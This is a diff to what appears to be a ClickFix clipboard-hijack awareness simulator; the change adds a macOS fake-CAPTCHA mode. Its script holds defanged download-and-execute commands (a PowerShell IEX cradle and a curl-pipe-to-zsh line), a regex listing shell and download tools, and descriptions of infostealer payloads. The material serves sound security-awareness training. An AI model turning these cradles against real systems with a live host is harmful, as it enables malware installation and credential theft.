@@ -124,6 +124,13 @@ h1.title{font-family:var(--serif);font-size:clamp(2rem,5vw,3rem);font-weight:600
 .terminal-output{font-family:var(--mono);font-size:.78rem;line-height:1.7;margin-top:1rem;display:none;white-space:pre-wrap;word-break:break-all}
 .terminal-output.visible{display:block}
 
+/* PLATFORM TOGGLE */
+.platform-toggle{display:flex;gap:.5rem;margin-bottom:1.25rem;align-items:center;flex-wrap:wrap}
+.platform-label{font-family:var(--mono);font-size:.62rem;letter-spacing:.15em;text-transform:uppercase;color:#64748b;margin-right:.5rem}
+.platform-btn{font-family:var(--mono);font-size:.68rem;letter-spacing:.1em;text-transform:uppercase;padding:.5rem 1.1rem;border:1px solid var(--rule);background:var(--paper);color:var(--ink3);border-radius:2px;cursor:pointer;transition:all .2s}
+.platform-btn:hover{border-color:var(--blue);color:var(--blue)}
+.platform-btn.active{background:var(--blue);border-color:var(--blue);color:#fff}
+
 /* STEP LABEL */
 .step-label{font-family:var(--mono);font-size:.62rem;letter-spacing:.15em;text-transform:uppercase;color:var(--blue);margin-bottom:.75rem;margin-top:1.5rem}
 
@@ -194,7 +201,7 @@ footer a{color:#4a9eff;text-decoration:none}
     <span class="notice-icon">⚠️</span>
     <div class="notice-text">
       <strong>Educational Demonstration Only</strong>
-      This tool simulates a ClickFix clipboard hijack using a defanged, non-functional payload for awareness training. No real malware is involved. The command shown is based on the TELEPUZ campaign documented by Elastic Security Labs (July 2026) and has been modified to be completely harmless.
+      This tool simulates a ClickFix clipboard hijack using a defanged, non-functional payload for awareness training. No real malware is involved. The command shown is based on the TELEPUZ campaign documented by Elastic Security Labs (July 2026) and has been modified to be completely harmless. The macOS version is based on ClickFix links targeting Macs in the author's research data (September 2026) and points to an unsupported hxxps:// address on a .invalid domain, so it cannot run.
     </div>
   </div>
 
@@ -207,6 +214,12 @@ footer a{color:#4a9eff;text-decoration:none}
   <!-- TAB 1: DEMO -->
   <div class="tab-panel active" id="panel-demo">
 
+    <div class="platform-toggle">
+      <span class="platform-label">Platform</span>
+      <button class="platform-btn active" id="btn-windows" onclick="setPlatform('windows')">Windows</button>
+      <button class="platform-btn" id="btn-macos" onclick="setPlatform('macos')">macOS</button>
+    </div>
+
     <div class="step-label" style="margin-top:0">Step 1 — Copy the command from the page below</div>
 
     <div class="fake-site">
@@ -216,27 +229,27 @@ footer a{color:#4a9eff;text-decoration:none}
           <div class="fake-dot" style="background:#ffbd2e"></div>
           <div class="fake-dot" style="background:#27c93f"></div>
         </div>
-        <div class="fake-url">docs.config-helper.dev/install</div>
+        <div class="fake-url" id="fakeUrl">docs.config-helper.dev/install</div>
       </div>
       <div class="fake-site-body">
-        <h2>Quick Install — @utils/config-helper</h2>
-        <p class="fake-desc">The fastest way to get started. Copy the command below and paste it into your terminal.</p>
-        <div class="fake-step"><div class="fake-step-num">1</div>Make sure Node.js 18+ is installed</div>
-        <div class="fake-step"><div class="fake-step-num">2</div>Copy the install command below</div>
-        <div class="fake-step"><div class="fake-step-num">3</div>Paste and run in your terminal</div>
+        <h2 id="fakeTitle">Quick Install — @utils/config-helper</h2>
+        <p class="fake-desc" id="fakeDesc">The fastest way to get started. Copy the command below and paste it into your terminal.</p>
+        <div class="fake-step"><div class="fake-step-num">1</div><span id="fakeStep1">Make sure Node.js 18+ is installed</span></div>
+        <div class="fake-step"><div class="fake-step-num">2</div><span id="fakeStep2">Copy the install command below</span></div>
+        <div class="fake-step"><div class="fake-step-num">3</div><span id="fakeStep3">Paste and run in your terminal</span></div>
         <div class="code-block-wrap">
           <div class="code-block-header">
-            <span class="code-block-label">Install Command</span>
+            <span class="code-block-label" id="codeLabel">Install Command</span>
             <button class="copy-btn" id="copyBtn" onclick="simulateHijack()">Copy</button>
           </div>
-          <div class="code-content">npm install @utils/config-helper</div>
+          <div class="code-content" id="codeVisible">npm install @utils/config-helper</div>
         </div>
       </div>
     </div>
 
     <div class="hijack-alert" id="hijackAlert">
       <div class="hijack-alert-title">⚠ Clipboard Hijacked — You Have No Way to Know This Happened</div>
-      <p>You clicked Copy. JavaScript on the page silently replaced your clipboard with a malicious PowerShell command. The page looks exactly the same. Nothing changed visually. Your clipboard now contains something you never read. Now paste into the terminal below.</p>
+      <p id="hijackText">You clicked Copy. JavaScript on the page silently replaced your clipboard with a malicious PowerShell command. The page looks exactly the same. Nothing changed visually. Your clipboard now contains something you never read. Now paste into the terminal below.</p>
     </div>
 
     <div class="step-label">Step 2 — Paste into the terminal below and click Run</div>
@@ -248,12 +261,12 @@ footer a{color:#4a9eff;text-decoration:none}
           <div class="terminal-dot" style="background:#ffbd2e;margin-left:4px"></div>
           <div class="terminal-dot" style="background:#27c93f;margin-left:4px"></div>
         </div>
-        <span class="terminal-label">Terminal — bash</span>
+        <span class="terminal-label" id="terminalLabel">Terminal — bash</span>
       </div>
       <div class="terminal-body">
         <div class="terminal-hint">Paste here with Cmd+V or Ctrl+V, then click Run</div>
         <div class="terminal-prompt">
-          <span class="terminal-prompt-symbol">$</span>
+          <span class="terminal-prompt-symbol" id="promptSymbol">$</span>
           <input class="terminal-input" id="terminalInput" type="text" placeholder="paste command here..." oninput="checkInput()" onpaste="handlePaste()">
         </div>
         <div class="terminal-output" id="terminalOutput"></div>
@@ -275,7 +288,7 @@ footer a{color:#4a9eff;text-decoration:none}
       <div class="report-body">
         <div class="report-row">
           <div class="report-label">What You Saw on the Page</div>
-          <div class="report-value green">npm install @utils/config-helper</div>
+          <div class="report-value green" id="reportSeen">npm install @utils/config-helper</div>
         </div>
         <div class="report-row">
           <div class="report-label">What Was in Your Clipboard</div>
@@ -283,7 +296,7 @@ footer a{color:#4a9eff;text-decoration:none}
         </div>
         <div class="report-row">
           <div class="report-label">Attack Type</div>
-          <div class="report-value amber">ClickFix — JavaScript Clipboard Hijack</div>
+          <div class="report-value amber" id="reportAttack">ClickFix — JavaScript Clipboard Hijack</div>
         </div>
         <div class="report-row">
           <div class="report-label">Payload Family</div>
@@ -295,7 +308,7 @@ footer a{color:#4a9eff;text-decoration:none}
         </div>
         <div class="report-summary">
           <strong>What just happened to you</strong>
-          You copied what looked like a routine npm install command. JavaScript on the page replaced your clipboard with a PowerShell command that would have downloaded and executed TELEPUZ — a modular MaaS payload active since April 2026 with 36 commands including a keylogger, credential stealer, Chrome cookie extractor, and a Polygon blockchain-based C2. You saw nothing unusual. The page looked legitimate. The action felt mechanical. That is exactly how ClickFix works.
+          <span id="reportSummaryText">You copied what looked like a routine npm install command. JavaScript on the page replaced your clipboard with a PowerShell command that would have downloaded and executed TELEPUZ — a modular MaaS payload active since April 2026 with 36 commands including a keylogger, credential stealer, Chrome cookie extractor, and a Polygon blockchain-based C2. You saw nothing unusual. The page looked legitimate. The action felt mechanical. That is exactly how ClickFix works.</span>
         </div>
       </div>
     </div>
@@ -392,8 +405,71 @@ footer a{color:#4a9eff;text-decoration:none}
 </footer>
 
 <script>
-const VISIBLE = 'npm install @utils/config-helper';
-const HIJACKED = 'powershell -NoP -w h -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'https://memshowblob[.]forum/api/index.php?a=grab\')"';
+const PLATFORMS = {
+  windows: {
+    url: 'docs.config-helper.dev/install',
+    title: 'Quick Install — @utils/config-helper',
+    desc: 'The fastest way to get started. Copy the command below and paste it into your terminal.',
+    steps: ['Make sure Node.js 18+ is installed', 'Copy the install command below', 'Paste and run in your terminal'],
+    codeLabel: 'Install Command',
+    visible: 'npm install @utils/config-helper',
+    hijacked: 'powershell -NoP -w h -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'https://memshowblob[.]forum/api/index.php?a=grab\')"',
+    hijackText: 'You clicked Copy. JavaScript on the page silently replaced your clipboard with a malicious PowerShell command. The page looks exactly the same. Nothing changed visually. Your clipboard now contains something you never read. Now paste into the terminal below.',
+    terminalLabel: 'Terminal — bash',
+    prompt: '$',
+    attack: 'ClickFix — JavaScript Clipboard Hijack',
+    family: 'TELEPUZ (MaaS) — Active campaign since April 2026. Documented by Elastic Security Labs July 16, 2026.',
+    outcome: 'PowerShell silently downloads a VIDAR dropper from memshowblob[.]forum, which installs TELEPUZ — a modular payload with keylogger, credential stealer, Chrome cookie extractor, and Polygon blockchain C2.',
+    summary: 'You copied what looked like a routine npm install command. JavaScript on the page replaced your clipboard with a PowerShell command that would have downloaded and executed TELEPUZ — a modular MaaS payload active since April 2026 with 36 commands including a keylogger, credential stealer, Chrome cookie extractor, and a Polygon blockchain-based C2. You saw nothing unusual. The page looked legitimate. The action felt mechanical. That is exactly how ClickFix works.'
+  },
+  macos: {
+    url: 'secure-check.example/verify',
+    title: 'Verify You Are Human',
+    desc: 'Complete this quick check to continue to the site.',
+    steps: ['Press Command + Space and type Terminal', 'Click Copy below, then paste into Terminal with Command + V', 'Press Return to finish verification'],
+    codeLabel: 'Verification Code',
+    visible: 'verify-human --session 4821-9937',
+    // Deliberately non-functional: curl rejects the hxxps:// scheme and .invalid never resolves.
+    // Do not use [.] defanging here: curl expands [.] as a URL pattern back to a real dot.
+    hijacked: 'curl -fsSL "hxxps://secure-check.example.invalid/curl/4f2a9c61e0b7d3a8" | zsh',
+    hijackText: 'You clicked Copy. JavaScript on the page silently replaced your clipboard with a command that downloads a script and pipes it straight into zsh, the Mac shell. The page looks exactly the same. Nothing changed visually. Your clipboard now contains something you never read. Now paste into the terminal below.',
+    terminalLabel: 'Terminal — zsh',
+    prompt: '%',
+    attack: 'ClickFix — Fake CAPTCHA Clipboard Hijack (macOS)',
+    family: 'AMOS / MacSync (macOS infostealer). ClickFix links targeting Macs were observed in the author\'s research data, September 14 to 20, 2026.',
+    outcome: 'zsh runs a first-stage script, which fetches an AppleScript stage and then a Mach-O backdoor. AMOS is documented collecting browser passwords and cookies, crypto wallets, and Keychain data.',
+    summary: 'You were asked to prove you are human. The page told you to open Terminal and paste a verification code. JavaScript replaced your clipboard with a command that would have downloaded a script and run it in zsh, starting a three-stage chain that ends with a Mac infostealer. No real verification ever asks you to open Terminal. That is exactly how ClickFix works on a Mac.'
+  }
+};
+
+let platform = 'windows';
+let VISIBLE = PLATFORMS.windows.visible;
+let HIJACKED = PLATFORMS.windows.hijacked;
+
+function setPlatform(name) {
+  const p = PLATFORMS[name];
+  if (!p) return;
+  platform = name;
+  VISIBLE = p.visible;
+  HIJACKED = p.hijacked;
+  document.getElementById('btn-windows').classList.toggle('active', name === 'windows');
+  document.getElementById('btn-macos').classList.toggle('active', name === 'macos');
+  document.getElementById('fakeUrl').textContent = p.url;
+  document.getElementById('fakeTitle').textContent = p.title;
+  document.getElementById('fakeDesc').textContent = p.desc;
+  document.getElementById('fakeStep1').textContent = p.steps[0];
+  document.getElementById('fakeStep2').textContent = p.steps[1];
+  document.getElementById('fakeStep3').textContent = p.steps[2];
+  document.getElementById('codeLabel').textContent = p.codeLabel;
+  document.getElementById('codeVisible').textContent = p.visible;
+  document.getElementById('hijackText').textContent = p.hijackText;
+  document.getElementById('terminalLabel').textContent = p.terminalLabel;
+  document.getElementById('promptSymbol').textContent = p.prompt;
+  document.getElementById('reportSeen').textContent = p.visible;
+  document.getElementById('reportAttack').textContent = p.attack;
+  document.getElementById('reportSummaryText').textContent = p.summary;
+  resetDemo(true);
+}
 
 let hijacked = false;
 
@@ -436,15 +512,15 @@ function runCommand() {
   const out = document.getElementById('terminalOutput');
   const report = document.getElementById('report');
   const isAttack = hijacked && input !== VISIBLE;
-  const looksEvil = /powershell|iex|downloadstring|bypass|invoke/i.test(input);
+  const looksEvil = /powershell|iex|downloadstring|bypass|invoke|curl|zsh|osascript|\|\s*(ba|z)?sh\b/i.test(input);
 
   out.classList.add('visible');
 
   if (isAttack || looksEvil) {
     out.innerHTML = '<span style="color:#ef4444">⚠ CLICKFIX SIMULATOR — INTERCEPTED</span>\n<span style="color:#64748b">This is not what the page showed you.</span>\n<span style="color:#64748b">In a real attack, this command would now be executing on your machine.</span>';
     document.getElementById('reportActual').textContent = input;
-    document.getElementById('reportFamily').textContent = 'TELEPUZ (MaaS) — Active campaign since April 2026. Documented by Elastic Security Labs July 16, 2026.';
-    document.getElementById('reportOutcome').textContent = 'PowerShell silently downloads a VIDAR dropper from memshowblob[.]forum, which installs TELEPUZ — a modular payload with keylogger, credential stealer, Chrome cookie extractor, and Polygon blockchain C2.';
+    document.getElementById('reportFamily').textContent = PLATFORMS[platform].family;
+    document.getElementById('reportOutcome').textContent = PLATFORMS[platform].outcome;
     document.getElementById('reportBadge').textContent = 'THREAT DETECTED';
     document.getElementById('reportBadge').style.background = 'var(--red)';
   } else {
@@ -460,7 +536,7 @@ function runCommand() {
   setTimeout(() => report.scrollIntoView({behavior:'smooth', block:'start'}), 200);
 }
 
-function resetDemo() {
+function resetDemo(keepScroll) {
   hijacked = false;
   document.getElementById('copyBtn').textContent = 'Copy';
   document.getElementById('copyBtn').classList.remove('copied');
@@ -470,7 +546,7 @@ function resetDemo() {
   document.getElementById('terminalOutput').innerHTML = '';
   document.getElementById('report').classList.remove('visible');
   document.getElementById('runBtn').classList.remove('ready');
-  window.scrollTo({top:0, behavior:'smooth'});
+  if (!keepScroll) window.scrollTo({top:0, behavior:'smooth'});
 }
 </script>
 </body>
